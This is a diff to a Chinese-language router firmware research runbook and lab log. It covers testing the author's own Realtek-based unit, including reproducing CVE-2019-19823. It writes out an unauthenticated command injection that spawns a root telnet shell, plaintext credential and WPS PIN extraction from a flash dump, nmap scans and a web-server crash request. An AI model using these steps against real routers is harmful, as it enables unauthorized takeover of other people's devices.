@@ -1689,6 +1689,11 @@ enxfc19286184c9  UNKNOWN        10.1.1.100/24
 > 而 Ethernet 還沒初始化。** 板子在 `<RealTek>` 時通常是有的（開機 log 會印
 > `---Ethernet init Okay!`），但 `IPCONFIG` 之前它不回應 IP。
 
+> 🔴 **反過來不成立：有 `LOWER_UP` 不代表裝置上電了。** 這張 rtl8153 在對端沒有東西
+> 的時候也會宣告 carrier=1。2026-08-18 進站當天，板子確實斷電而 `carrier` 是 1。
+> **獨立的來源是 `rx_packets` 加 `ip neigh`** —— 那一次 ARP 是 `INCOMPLETE`、
+> `rx_packets` 是 0、HTTP 無回應，三個一致才判定裝置沒在講話。
+
 **為什麼是 `10.1.1.100`**：這台的 LAN 位址是 `10.1.1.1`（從它自己的 `COMPCS` 解出來的，
 不是猜的），DHCP 池是 `10.1.1.100`–`254`。`.100` 在池子裡但不會跟前幾個租約撞。
 **如果你的機器不是 `10.1.1.1`**，先解出來：
@@ -1858,6 +1863,99 @@ date +%s.%N
 > ⚠️ **`stty` 的那一長串不是裝飾。** `-echo` 沒關的話你送的字元會被回傳，
 > log 裡會出現重複；`-ixon -ixoff` 沒關的話 `0x11`/`0x13` 這兩個 byte 會被
 > 當成流量控制吃掉 —— 而 flash 裡到處都是那兩個 byte。
+
+#### A3.2.4 ★ `P2-11`：開機後 601 秒的視窗，而它要量的是翻面的那一秒
+
+**這一小節 2026-08-18 進站當天補寫，補的是一個真實的缺口**：`A3.2` 的標題從
+增補起就寫著「（一次上電餵四項）（關 `P1-12` · `P2-11`）」，而它的內文寫「一次完整的
+上電同時交付**三**樣東西」並且從頭到尾沒有提過 `P2-11`。`coldboot-timing.sh` 自己的
+檔頭也只列三件。**一節聲稱關掉的編號，在它自己的內文裡沒有程序** —— 而
+`tools/check-runsheet.py` 驗的是「標題聲稱的編號在登記簿裡」與「已執行的列有節聲稱
+它」，這兩個方向都驗不到這一種。記在 `PROGRESS.md` 開放題。
+
+**先決條件**（四個，缺一不可）：
+
+- `A3.2.1` 剛跑完，`coldboot-*.log` 在手上 —— 這一小節的時鐘從那份 log 來
+- **儲存密碼非空**（`A3.7` 的 `bad` 那一列是 `302`）。密碼一旦為空，第 3 步的
+  `200` 量到的是 `D-4` 不是這一條
+- **`A3.11.2` 還沒跑**（它會把密碼設成空字串）
+- `10.1.1.101` 這個第二來源位址已經加上去（`A3.7` 的 session 段加過）
+
+**這一步為什麼不能在模擬環境上做**：`qemu-user` 的 `sysinfo()` 回的是**宿主**的
+uptime，任何開了一天的桌機都早就超過 601 秒 —— 所以模擬下這條臂永遠讀起來是死的。
+**這是全登記簿裡唯一一條「只有實機能答」寫在標題上的。**
+
+**取時鐘 —— 601 秒是從 kernel 開始算，不是從通電開始算：**
+
+```bash
+LOG="$(ls -1t "$HOME/fwre-work/dumps"/coldboot-*.log | head -1)"
+grep -n 'booting the kernel' "$LOG" | head -1
+KT0="$(awk '/booting the kernel/{print $1; exit}' "$LOG")"
+T0="$(head -1 "$LOG" | awk '{print $1}')"
+echo "console t0 = $T0"
+echo "kernel  t0 = $KT0   (+$(awk -v a="$T0" -v b="$KT0" 'BEGIN{printf "%.2f", b-a}') s)"
+```
+
+**預期**：kernel 那一行大約在 console 第一行之後 **6.9 秒**（`A3.2.2` 的分段表）。
+
+> 🔴 **拿 console 第一行當 t0 會讓視窗邊界早 7 秒，而預測的精度只有 1 秒。**
+> `beforeuptime` 沒有任何寫入點，所以那個差值就是**系統 uptime**，
+> 而系統 uptime 從 kernel 起跑，不是從通電。
+
+**跑：**
+
+```bash
+bash tools/session-window.sh --host 10.1.1.1 --page /password.htm      --user admin --password admin      --src-a 10.1.1.100 --src-b 10.1.1.101      --kernel-t0 "$KT0" --until 800 --interval 10      -o "$HOME/fwre-work/dumps/p2-11-session-window.json"
+```
+
+> 🔴 **第 2 步必須是 POST 到 `/boafrm/formLogin`，不可以是一發帶憑證的 GET。**
+> 寫 `authipaddr` 的是**登入表單的 handler**，不是任何一個通過認證的請求。
+> HTTP Basic 走 `process_header_end` 的憑證比對，那條路徑從頭到尾不會經過
+> `form_formLogin`。**這一節的第一版就是拿 Basic GET 當登入**，於是在成功登入的
+> 下一秒量到 `302`，而那看起來跟「這條臂在這台是死的」一模一樣 ——
+> 差一點就把一個自己造成的假陰性寫成本週最重的反證。工具現在預設就打
+> 那個 handler（`--login-path` / `--user-field` / `--pass-field` 可以改）。
+
+> ⚠️ **`--until 800` 不是隨便選的，它讓這一測回答一個登記簿沒問的問題。**
+> 如果 `beforeuptime` 真的沒有任何寫入點（值是 0），窗口在 **uptime 601** 關；
+> 如果它其實在登入時被寫了，窗口會在 **登入時刻 + 601** 關。這一場的登入落在
+> uptime 230 附近，所以兩個假設的翻面點差 230 秒，**一次量測就分得開**。
+> `800` 蓋得住後者，`760` 蓋不住。
+
+**預期 —— 三段，而中間那一段是唯一會動的：**
+
+```text
+  ==>   step 1: a control BEFORE any login -- both addresses, no credentials
+        uptime 45.2    A(10.1.1.100) 302   B(10.1.1.101) 302
+  ==>   step 2: one successful login from A only, through /boafrm/formLogin
+        uptime 47.9  A posts to the login handler -> 200
+  ==>   steps 3-5: poll both addresses without credentials across the boundary
+        uptime    A      B      note
+        50.1      200    302
+        60.2      200    302
+        …
+        600.9     200    302
+        611.0     302    302    <- A stopped being let through
+        …
+  ==>   A stopped returning 200 at uptime 611.0
+```
+
+**判定**：`A` 在 601 之前是 `200`、`B` 每一格都是 `302`、`A` 在 601 之後是 `302`
+—— **三段都要對，少一段不算**。翻面點落在 `[601, 601+interval)` 裡。
+
+> 🔴 **`B` 那一欄是把「視窗關了」跟「伺服器不回應了」分開的唯一東西。**
+> 如果某一格 `A` 和 `B` 同時變成 `000`，那是 `boa` 掛了不是視窗到期，
+> 而那兩件事在只看 `A` 的紀錄上長得一模一樣。
+
+> ❌ **step 1 的 `A` 就回 `200` → 停。** 那表示這一頁根本不被閘門保護，
+> 或者密碼是空的。回 `A3.7` 重新確認 `bad` 那一列是 `302`。
+
+> ❌ **step 2 的登入不是 `200` → 工具自己會停並且說為什麼。** 不要繼續讀下面的表：
+> 沒有成功登入就沒有 `authipaddr`，整段量的是別的東西。
+
+> ⚠️ **這一段要花十一分鐘，而那十一分鐘可以拿去跑 `A3.14`（UDP 偵察，唯讀）。**
+> 不可以拿去跑任何會改設定或會登入的節 —— 第二次成功登入會把 `authipaddr`
+> 重寫，翻面點就往後跳。
 
 ---
 
@@ -2363,7 +2461,7 @@ IDENTICAL
 ```bash
 "$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/config-dat.bin" \
     --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
-    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
+    --disclosure open -f md | grep -iE 'USER_NAME|USER_PASSWORD'
 ```
 
 然後拿那組值去跑 `A3.7` —— **它會通**。
@@ -2476,11 +2574,12 @@ bundle 那 143 個的分佈是 `A3.5` 閘門模型的複驗：`.htm` 多數 `302
 `flash get`）。所以登入成功是**在自己的機器上把 CVE-2019-19823 端到端走完**。
 
 ```bash
-# 從你的快照解出憑證。--disclosure protect 會遮掉,要看明文才加 reveal
+# 從你的快照解出憑證。`--disclosure` 只收 open / protect：protect 會把 per-unit
+# 識別碼換成 sha256，要看明文用 open。**沒有 reveal 這個值**
 "$HOME/fwre-work/venv/bin/python" -m fwrecon compcs \
     "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --offset 0xC000 \
     --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
-    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
+    --disclosure open -f md | grep -iE 'USER_NAME|USER_PASSWORD'
 ```
 
 **不帶憑證 / 帶憑證 / 帶錯的，三個一起打，才有對照組：**
@@ -3040,7 +3139,7 @@ bash tools/config-attrib.sh "$D/"*-pre.bin "$D/config-region-post-p35.bin"
 # 原值從 -pre.bin 解出來,不要用記憶裡的
 "$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/"*-pre.bin --offset 0xC000 \
   --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
-  --disclosure reveal -f md | grep -i 'WSC_PIN'
+  --disclosure open -f md | grep -i 'WSC_PIN'
 ```
 
 ```bash
@@ -3355,6 +3454,26 @@ sudo nmap -sT -p 5555,7547 10.1.1.1
 
 **預期**：9034 / 9999 / 20005 無回應；**而同一輪裡 1900 或 53 有回應當正對照**。
 
+> 🔴 **登記簿指定的那兩個正對照在這台上都不會回應，而理由不同。**
+> `53/udp` 沒有 relay 在聽（`dnrd` 由 `sysconf` 在 WAN phy 路徑上啟動，沒有 WAN 就不起來）；
+> `1900/udp` **有東西在聽**，但 `nmap` 的預設 SSDP 探測用 `ST: ssdp:all`，而這台不回答
+> `ssdp:all`，於是回報 `open|filtered` —— **在 UDP 語意裡那就是「沒收到回應」，
+> 跟「沒有東西在聽」長得一模一樣。**
+>
+> **可用的正對照是 DHCP，而它比登記簿要求的強**（一次完整的應用層往返，不是「沒有回應」）：
+>
+> ```bash
+> IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
+> sudo nmap --script broadcast-dhcp-discover -e "$IF"
+> ```
+>
+> **預期**：一份 `DHCPOFFER`，`Server Identifier: 10.1.1.1`。
+>
+> **而 `1900` 要用具體的 ST 才問得出來**：`upnp:rootdevice`、
+> `urn:schemas-wifialliance-org:device:WFADevice:1`、
+> `urn:schemas-wifialliance-org:service:WFAWLANConfig:1` 三個都會回 200，
+> 那是 `wscd` 而不是 `miniigd` —— **這台有兩個 UPnP 堆疊，`UPNP_ENABLED` 只關掉一個。**
+
 > 🔴 **沒有正對照的「全部關閉」量到的是鏈路，不是裝置。** UDP 沒有交握，
 > 「沒有回應」與「封包沒送到」在觀測上完全相同。
 
@@ -3487,11 +3606,28 @@ sudo tcpdump -i eth1 -s0 -w dumps/w07-creds.pcap 'host 10.1.1.1 and tcp port 80'
 |---|---|---|---|
 | T3 | **第一發會把 `boa` 弄掉，要斷電** | [`RUNBOOK` §8.12.37](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
 
-**分成兩發，而且不准混在同一張卡上：**
+**分成兩發，而且不准混在同一張卡上。**
+
+> 🔴 **順序是「2 先於 1」，而編號沒有改是為了讓這條修正看得見。**
+> 第一發是**終局的**——`boa` 消失而且不會自己回來——而第二發需要 `boa` 活著。
+> 照編號跑，第二發根本打不成。2026-08-18 進站當天發現，當天就是這樣跑的。
+
+> 🔴 **開火之前先開第二條路。** 第一發之後 console 會印
+> `caught SIGSEGV, dumping core in /tmp`，而那份 core 取不回來：`boa` 是唯一的入口、
+> `/tmp` 是 tmpfs（重開就沒）、序列埠會回顯但不回應（沒有 shell）。先送一發
+> 命令注入把 `telnetd` 起來，崩潰之後才有地方站：
+>
+> ```bash
+> curl -s -o /dev/null -m 10 -X POST http://10.1.1.1/boafrm/formSysCmd >   --data-urlencode 'sysCmd=telnetd -l /bin/sh &' --data 'submit-url=/syscmd.htm'
+> ```
+>
+> ⚠️ **那是一個沒有認證的 root shell**，收工前必須斷電。
 
 1. `formSchedule`，**缺 `webpage`**。預期：web server 消失且不會自己回來。
 2. 另外抽 2–3 個原本在那 39 個裡、現在活著的（`formNtp`、`formDMZ`）。
    **預期：它們在矽上會活著**，因為核心會補對齊。
+   **每一發給 30 秒以上的 timeout**：`formWlanSetup` 要 10.3 秒才回 200，而 6 秒的
+   timeout 產生的 `000` 跟崩潰長得一模一樣。
 
 > ⚠️ **第二發的反證條件比第一發的預測重要。** 如果那 2–3 個在實機上也死掉，
 > **對齊那套解釋就是錯的**，而 `tools/alignfix` 打開之後量到的每一件事、
@@ -3915,3 +4051,37 @@ P2-9 的桌面半邊、P8-1 P8-5 P8-8 P8-10 P8-18 P8-24 P9-13 P10-7 ——
 `reboot -f` 把宿主關掉三次）。前兩件是昨天那一發沒跑成的真正原因；第三件在今晚
 沒有直接作用，**但它把「這一發最多只會弄壞模擬器」這句話刪掉了** —— 那一發在真機
 上做的事跟在模擬器上做的一樣，差別只在宿主是誰。
+
+---
+
+## B-W07 進站實錄（2026-08-18 夜 — 2026-08-19 凌晨，**寫在跑完之後**）
+
+**這一則跟上面三塊不同：它是事後的。** 前面的都寫在動手之前，這一則記的是
+**實際跑出來的順序，以及它為什麼跟計畫不一樣**。分開標示，是因為兩者的證據力不同。
+
+| 循環 | 站 | 實際跑的 | 計畫寫的 |
+|---|---|---|---|
+| 1 | 第 2 站 | `A2.1` → `A2.2` → `A2.3` → `A2.4` → 拔電 | 相同（第 2 站是進站當天才加的） |
+| 2 | 第 3 站 | `A3.1` → `A3.7` → `A3.13` → 拔電 | 相同 |
+| 3 | 第 3 站 | `A3.2` → `A3.2.4` → `A3.14` → `A3.15` → `A3.16` → `A3.19` → `A3.18` → `A3.21` → `A3.22` → `A3.17` → **`A3.23` 第二發 → 第一發** → `A3.20` | `A3.23` 兩發的順序在計畫裡是反的 |
+| 4 | 第 3 站 | 重開 → `P6-3` | 計畫裡沒有這一格（`wscd` 要重開才回得來） |
+| 5 | WAN 側 | 換線 → `P8-19` 兩次 → 換回 | `A3.18` 的一部分 |
+| — | **未執行** | **`A3.24`（`P9-9`）** | **計畫排它在最後，而本場提前收工** |
+
+**計畫沒有預料到的五件事，全部寫進 Part A 了：**
+
+1. **`A3.23` 的兩發順序**（第一發是終局的）→ `A3.23`
+2. **崩潰測試前要先開 `telnetd`**（core dump 否則取不回）→ `A3.23`
+3. **`LOWER_UP` 不代表裝置上電**（rtl8153 會空宣告 carrier）→ `A3.1.2`
+4. **登記簿指定的兩個 UDP 正對照在這台都不會回應**，可用的是 DHCP → `A3.14`
+5. **`A3.2` 的標題聲稱 `P2-11` 而內文沒有程序** → 補成 `A3.2.4`，工具是
+   `tools/session-window.sh`
+
+**第 5 條是這一晚最貴的一課**：一節聲稱關掉的編號，在它自己的內文裡可以沒有程序，
+而 `tools/check-runsheet.py` 的兩個方向都驗不到那一種。記在 `PROGRESS.md` 開放題。
+
+**未執行的一節，以及它為什麼值得等**：`A3.24` / `P9-9`。本場結束時，
+`DHCP_MTU_SIZE=0`、`UPNP_ENABLED=0`、`ALG_SIP_ENABLED=0` 三個被 W05 寫壞的欄位
+同時還在原地，所以 reset 之後量它們**同時**回答 `P9-9` 自己的預測與
+`P8-19` 那條因果鏈的第三個獨立驗證。**在一台被弄髒的機器上按 reset，比在一台
+乾淨的機器上按，資訊量高得多。**
